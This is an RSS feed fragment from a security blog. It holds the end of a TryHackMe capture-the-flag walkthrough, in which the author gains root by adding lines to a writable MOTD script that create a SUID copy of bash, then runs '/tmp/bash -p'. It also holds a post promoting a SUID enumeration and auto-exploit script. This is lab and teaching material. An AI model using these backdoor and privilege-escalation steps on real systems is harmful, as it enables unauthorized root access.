As you may already know, we are soon planning to submit this machine to THM&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s CyberSecurity Platform! Crazy... Isn&amp;#39;&lt;/span&gt;t it? 

But there&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s still one thing I&amp;#39;&lt;/span&gt;d like you to &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 

Oh and one last thing... You gotta hurry up! We don&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have much time left &lt;span style=&#34;color:#66d9ef&#34;&gt;until&lt;/span&gt; the submission!

Best Regards,

root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ve seen &lt;code&gt;.bash_history&lt;/code&gt; containing a directory &lt;code&gt;/etc/update-motd.d/&lt;/code&gt;, let&amp;rsquo;s check it out!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:~$ ls -la /etc/update-motd.d/
total &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;
drwxr-xr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:38 .
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;12288&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 20:08 ..
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james  &lt;span style=&#34;color:#ae81ff&#34;&gt;1220&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:32 00-header
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:38 00-header.save
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james  &lt;span style=&#34;color:#ae81ff&#34;&gt;1157&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; 10-help-text
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james    &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; 90-updates-available
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james   &lt;span style=&#34;color:#ae81ff&#34;&gt;299&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; 91-release-upgrade
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james   &lt;span style=&#34;color:#ae81ff&#34;&gt;142&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; 98-fsck-at-reboot
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james   &lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; 98-reboot-required
-rwxrwxr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root james   &lt;span style=&#34;color:#ae81ff&#34;&gt;604&lt;/span&gt; Nov  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; 99-esm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that we&amp;rsquo;ve read/write/execute permissions on the files. But what can we do with these?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:/etc/update-motd.d$ cat 00-header
&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    00-header - create the header of the MOTD&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    Copyright (C) 2009-2010 Canonical Ltd.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    Authors: Dustin Kirkland &amp;lt;kirkland@canonical.com&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    This program is free software; you can redistribute it and/or modify&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    it under the terms of the GNU General Public License as published by&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    the Free Software Foundation; either version 2 of the License, or&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    (at your option) any later version.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    This program is distributed in the hope that it will be useful,&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    but WITHOUT ANY WARRANTY; without even the implied warranty of&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    GNU General Public License for more details.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    You should have received a copy of the GNU General Public License along&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    with this program; if not, write to the Free Software Foundation, Inc.,&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -r /etc/lsb-release &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; . /etc/lsb-release

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DISTRIB_DESCRIPTION&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -x /usr/bin/lsb_release &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# Fall back to using the very slow lsb_release utility&lt;/span&gt;
        DISTRIB_DESCRIPTION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;lsb_release -s -d&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;

printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to %s (%s %s %s)\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DISTRIB_DESCRIPTION&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -o&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -r&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -m&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Alright, seems like simple bash commands, let&amp;rsquo;s just copy &lt;code&gt;bash&lt;/code&gt; to &lt;code&gt;tmp&lt;/code&gt; and set root&amp;rsquo;s SUID bit on it and see if that works.&lt;/p&gt;
&lt;p&gt;Added the instructions in 3-4 lines.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:/etc/update-motd.d$ cat 00-header
&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh&lt;/span&gt;

cp /bin/bash /tmp/
chmod u+s /tmp/bash

&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    00-header - create the header of the MOTD&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    Copyright (C) 2009-2010 Canonical Ltd.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    Authors: Dustin Kirkland &amp;lt;kirkland@canonical.com&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    This program is free software; you can redistribute it and/or modify&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    it under the terms of the GNU General Public License as published by&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    the Free Software Foundation; either version 2 of the License, or&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    (at your option) any later version.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    This program is distributed in the hope that it will be useful,&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    but WITHOUT ANY WARRANTY; without even the implied warranty of&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    GNU General Public License for more details.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    You should have received a copy of the GNU General Public License along&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    with this program; if not, write to the Free Software Foundation, Inc.,&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -r /etc/lsb-release &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; . /etc/lsb-release

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DISTRIB_DESCRIPTION&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -x /usr/bin/lsb_release &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# Fall back to using the very slow lsb_release utility&lt;/span&gt;
        DISTRIB_DESCRIPTION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;lsb_release -s -d&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;

printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to %s (%s %s %s)\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DISTRIB_DESCRIPTION&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -o&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -r&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -m&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But how does this execute? Is there a cron? don&amp;rsquo;t think so.&lt;/p&gt;
&lt;p&gt;Since, the .bash_history shows we need to ssh for the instructions to execute, let&amp;rsquo;s try and SSH as james.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403150745.png&#34; alt=&#34;Pasted image 20210403150745.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;root&#34;&gt;Root!&lt;/h3&gt;
&lt;p&gt;Cool, we&amp;rsquo;ve got SUID bit of root user on the bash file, let&amp;rsquo;s get root! :)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:~$ /tmp/bash  -p
bash-4.3# id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; euid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
bash-4.3# cd /root
bash-4.3# ls -al 
total &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;
drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:36 .
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; ..
-rw-------  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;1257&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:38 .bash_history
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;3106&lt;/span&gt; Oct &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt; .bashrc
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 20:01 .bundle
drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:36 .cache
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 20:00 .gem
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 18:35 .nano
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt; .profile
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 20:56 root.txt
drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 20:55 .ssh
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;211&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 19:59 .wget-hsts
bash-4.3# 
bash-4.3# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is of the characters what we need!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;bash-4.3# wc -c root.txt 
&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; root.txt
bash-4.3# id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; euid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
bash-4.3# uname -a 
Linux osboxes 4.15.0-45-generic &lt;span style=&#34;color:#75715e&#34;&gt;#48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;Thanks for reading the walkthrough, hopefully you enjoyed it. I think maybe I was too verbose while writing it :P&lt;/p&gt;

        
        </description>
    </item>
    
    <item>
      <title>SUID Enumeration/Exploitation - The Automated Way!</title>
      <link>https://umar0x01.sh/post/suid-enumeration/</link>
      <pubDate>Wed, 23 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://umar0x01.sh/post/suid-enumeration/</guid>
      <description>
        
          &lt;img src=&#34;https://umar0x01.sh/img/screenshot_10.png&#34;/&gt;
          
        
        
        https://umar0x01.sh/post/suid-enumeration/#what-the-heck-is-suid-enum
&lt;h2 id=&#34;what-the-heck-is-suid-enum&#34;&gt;What the heck is SUID ENUM!?&lt;/h2&gt;
&lt;p&gt;Are you also tired of &lt;strong&gt;finding &amp;amp;&amp;amp; enumerating possibly exploitable SUID binaries&lt;/strong&gt; like me!? Only to miss the ones you were going to &lt;em&gt;escalate your priviliges&lt;/em&gt; with?&lt;/p&gt;
&lt;p&gt;Welp, I just happened to develop a solution: &lt;a href=&#34;https://github.com/Anon-Exploiter/SUID3NUM&#34;&gt;SUID 3NUM&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(Self promote, I will! - Yoda)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/screenshot_10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;A (not-so-cool-as-it-seems-like) standalone script supporting both &lt;strong&gt;python2&lt;/strong&gt; &amp;amp; &lt;strong&gt;python3&lt;/strong&gt; to find out all SUID binaries in a linux box and do the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;List all Default SUID Binaries (which ship with linux/aren&amp;rsquo;t exploitable)&lt;/li&gt;
&lt;li&gt;List all Custom Binaries (which don&amp;rsquo;t ship with packages/vanilla installation)&lt;/li&gt;
&lt;li&gt;List all Custom binaries found in GTFO Bin&amp;rsquo;s list (This is where things get interesting)&lt;/li&gt;
&lt;li&gt;Try and auto-exploit found custom SUID binaries which won&amp;rsquo;t impact any of the machine&amp;rsquo;s binaries&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;---description-goes-here---&#34;&gt;&amp;lt;!&amp;ndash; Description goes here &amp;ndash;&amp;gt;&lt;/h3&gt;
&lt;p&gt;Many of the times while doing &lt;strong&gt;Vulnhub&lt;/strong&gt;, &lt;strong&gt;HTB&lt;/strong&gt; &amp;amp;&amp;amp; other &lt;strong&gt;vulnerable machines&lt;/strong&gt;, I stumbled upon &lt;em&gt;SUID binaries&lt;/em&gt; in the box, I didn&amp;rsquo;t have any method to seperate exploitable SUID binaries from those default SUID binaries of the system.&lt;/p&gt;
&lt;p&gt;Fortunately, &lt;a href=&#34;https://github.com/rebootuser/LinEnum&#34;&gt;LinEnum&lt;/a&gt; seperated vulnerable binaries which were present in list of GTFO Bins and presented it nicely in a new section named &lt;code&gt;Interesting SUID Bins&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/troll_gifs/awesome.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;awesome-isnt-it&#34;&gt;Awesome, isn&amp;rsquo;t it?&lt;/h4&gt;
&lt;p&gt;By this time, you&amp;rsquo;ll be asking yourself, then why da heck I made this blog post and that script, &lt;strong&gt;If LinEum is so cool!?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;h5 id=&#34;lets-get-on-that-now&#34;&gt;Lets get on that now:&lt;/h5&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/troll_gifs/finally.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;What if a binary &lt;strong&gt;isn&amp;rsquo;t&lt;/strong&gt; in GTFO&amp;rsquo;s bins list and is still exploitable?&lt;/li&gt;
&lt;li&gt;What If the sysadmin renamed the exploitable binary (like &lt;em&gt;cp, find, cat, vim, iftop etc.&lt;/em&gt;) to something else?&lt;/li&gt;
&lt;li&gt;What if there&amp;rsquo;s a custom C/C++ compiled binary having SUID bit set on it?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You&amp;rsquo;ll definitely miss that one binary through which you were going to escalate yourself to the next level. We all know, when LinEnum shows interesting SUID bins list, nobody ever looks at the whole list of the SUID binaries!&lt;/p&gt;
&lt;p&gt;Also, LinEnum and other enumeration scripts only print SUID binaries &amp;amp; GTFO Binaries, they don&amp;rsquo;t seperate default binaries from custom binaries, which lead to severe head banging in walls for 3-4 hours when you can&amp;rsquo;t escalate priviliges :)&lt;/p&gt;
&lt;h5 id=&#34;solution&#34;&gt;Solution:&lt;/h5&gt;
&lt;p&gt;The above issues struck me to create a script which seperates both custom SUID bit-set binaries and default binaries, cross-match custom binaries with GTFO Bin&amp;rsquo;s binaries list. Further, go-ahead, try and auto-exploit them (only in case, they aren&amp;rsquo;t going to &lt;strong&gt;alter any files&lt;/strong&gt; on the system!)&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;usage&#34;&gt;Usage&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Initializing Script&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python suid3num.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Doing Auto Exploitation of Exploitable SUID binaries&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python suid3num.py -e
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3 id=&#34;screenshotsworking&#34;&gt;Screenshots/Working&lt;/h3&gt;
&lt;p&gt;Here are some screenshots describing output of the script:&lt;/p&gt;
&lt;div class=&#34;gallery&#34; data-columns=&#34;3&#34;&gt;
	&lt;img src=&#34;https://umar0x01.sh/img/suidenum/all_bins.png&#34;&gt;
	&lt;img src=&#34;https://umar0x01.sh/img/suidenum/def_binaries.png&#34;&gt;
	&lt;img src=&#34;https://umar0x01.sh/img/suidenum/custom_bins.png&#34;&gt;
	&lt;img src=&#34;https://umar0x01.sh/img/suidenum/suid_bins.png&#34;&gt;
	&lt;img src=&#34;https://umar0x01.sh/img/suidenum/exploitation.png&#34;&gt;
&lt;/div&gt;
&lt;hr&gt;
